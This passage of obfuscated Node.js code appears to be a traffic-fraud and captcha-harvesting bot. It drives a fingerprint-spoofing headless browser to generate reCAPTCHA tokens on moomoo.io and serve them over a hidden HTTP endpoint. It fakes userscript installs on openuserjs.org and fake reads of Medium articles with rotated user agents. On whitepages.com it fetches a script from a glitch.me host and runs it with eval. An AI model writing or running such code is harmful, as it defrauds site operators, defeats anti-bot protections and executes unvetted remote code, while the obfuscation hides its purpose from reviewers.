      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + X(0xb) + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + W(0x0, 'IqK[') + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + W(0xa, 'o#L#') + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + V(0x8),
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + X(0x6) + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x18d * 0x15 + -0x25e1 + 0x550
  };

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x1 * 0x22af + 0x4a2 * -0x2 + 0x1b * -0xf1);
    let h = e[f];
    if (b['xQiofD'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x621 + 0x1f69 + 0xa * -0x3c1, s, t, u = 0x12b7 + -0x845 * 0x1 + 0x539 * -0x2; t = n['charAt'](u++); ~t && (s = r % (-0x1a19 + -0x1f94 + 0x223 * 0x1b) ? s * (-0x9d8 + -0x6b * 0x52 + -0x162f * -0x2) + t : t, r++ % (-0x4a2 * 0x2 + -0x7 * -0x227 + -0x5c9)) ? p += String['fromCharCode'](0x1 * -0x181 + 0xc * -0x1a3 + 0xd * 0x1b4 & s >> (-(0x11b6 + -0x2 * -0x67 + 0x2e * -0x67) * r & -0x1d2 * 0xa + 0x31b * 0x7 + -0x383)) : 0x2388 + 0xa93 + -0x2e1b) {
          t = o['indexOf'](t);
        }
        for (let v = 0x8 * -0xd + -0x1b7b + 0xb * 0x289, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x47 * -0x1 + -0x444 + 0x40d))['slice'](-(-0x2172 * 0x1 + 0x1f1d + 0x1 * 0x257));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0xb7f + -0x288 + 0xe07,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x2022 + -0xffd + -0x1025; u < 0xbe7 + -0x1d28 + 0x1241 * 0x1; u++) {
          p[u] = u;
        }
        for (u = -0x24fa + 0x143 * -0x2 + 0x2780; u < 0xe2 * 0x8 + 0x220b + -0x281b; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x4c3 + -0x9fb + -0x7df * -0x2), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1 * -0xa00 + 0x1cba * 0x1 + 0x2f * -0x66, q = -0x7d8 + 0x11bf + -0x9e7;
        for (let v = 0x64 + -0x1a9b * 0x1 + -0x8bd * -0x3; v < n['length']; v++) {
          u = (u + (-0x159c + 0x3 * -0x51b + 0x24ee)) % (0x4 * -0xc9 + -0xbc * 0x17 + 0x1 * 0x1508), q = (q + p[u]) % (0x1a64 + -0xb0a + -0xe5a), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x151 * 0xb + -0x26d8 + 0x3653 * 0x1)]);
        }
        return t;
      };
      b['FaBOCY'] = m, c = arguments, b['xQiofD'] = !![];
    }
    const j = e[0x65 * 0x3 + 0x23f * -0x2 + -0x7 * -0x79],
      k = f + j,
      l = c[k];
    return !l ? (b['cEPvIz'] === undefined && (b['cEPvIz'] = !![]), h = b['FaBOCY'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x1fa8 + -0x1dd + 0x2185)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0xb2f + 0x881 * 0x2 + -0x1bcd), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x4f9 * 0x2 + -0x3d1 * 0x1 + -0x1 * 0x5bd), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x116d + 0x2 * -0x815 + -0x2197 * -0x1;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x432 + 0x373 + -0x1 * -0xbf; w < getRandomInt(0xd5 * 0x1b + -0x1fa4 + 0x92e, -0x25eb + -0x55d * 0x1 + 0x2b4d); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x19 * -0x175 + 0x1437e + -0x34b1);
        }
      }();
    }, -0x1 * -0x1773 + -0x1630 * 0x1 + -0xdf), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const Y = c;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x262 * -0x5 + 0x22dd + -0x2ec7;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x[Y(0xf)](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x2d5 * 0xa + -0x1e50 + 0x1fe, -0x14f * 0xb + 0xbe7 * 0x1 + 0x56 * 0x8)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0xae * -0x1f + -0x45 * -0x293 + 0xd1f * -0x3);
    }, -0x20b6 + -0xaf3 + 0x2c0d), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x1617 + -0x865 + 0xf3e * 0x2;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x19d2 + 0x4 * -0x371 + 0x334e), await u['evaluate'](() => {
            const Z = d;
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + Z(0x7) + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0xe7b + -0x188a + 0x2705), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x2dea9 + 0x6e71a + 0x3f5dd);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x5bb + -0x10fd + -0x8e * -0x15);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x249a + -0x23e6 * -0x1 + 0x44 * -0x10e);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x6 * 0x7a + -0x11 * 0x1ff + 0x399 * 0x13);
}
doFlags['doOUJS'] && ((async () => {
  const a0 = c;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x2534 + -0x4b5 + 0x103f * -0x2) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x70b + 0x12e + 0x5de));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x15d * -0x6 + -0x1bc3 + 0x23f1, D['indexOf']('\x20'));
        return B ? E['slice'](0x1 * -0x1005 + -0x202b + 0x10 * 0x303, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x192 * -0x1c + -0x1 * -0x4d + -0x52bb * -0x1),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x41e0 + 0x3895 + -0x1 * -0x305b),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + a0(0xd) + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + a0(0x5) + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x7 * 0x4e4 + -0x131 * 0x17 + 0x3da3; k < 0x22ab + 0x10c2 + 0x1 * -0x3369; k++)
    setTimeout(f, (0x18c58 + 0x1b689 + -0x25881) * k * getRandomInt(-0x24e + -0x1010 + 0x125f, 0x155c + -0x30a * -0x9 + -0x6f5 * 0x7));
  setInterval(() => {
    f();
    for (let l = 0x1518 + 0x2 * 0x9d + -0x1652; l < -0x1 * -0x1741 + -0x1b5 + 0xd4 * -0x1a; l++)
      setTimeout(f, (-0xd8f0 + -0xcc22 + 0x28f72) * l * getRandomInt(-0x1ced + 0x22ad + -0x5bf, 0x1 * -0x1157 + -0x1a31 + -0x47 * -0x9d));
  }, 0x1 * -0x6d1c9b + 0xce91 * -0x16 + -0x6b * -0x1b2f3);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
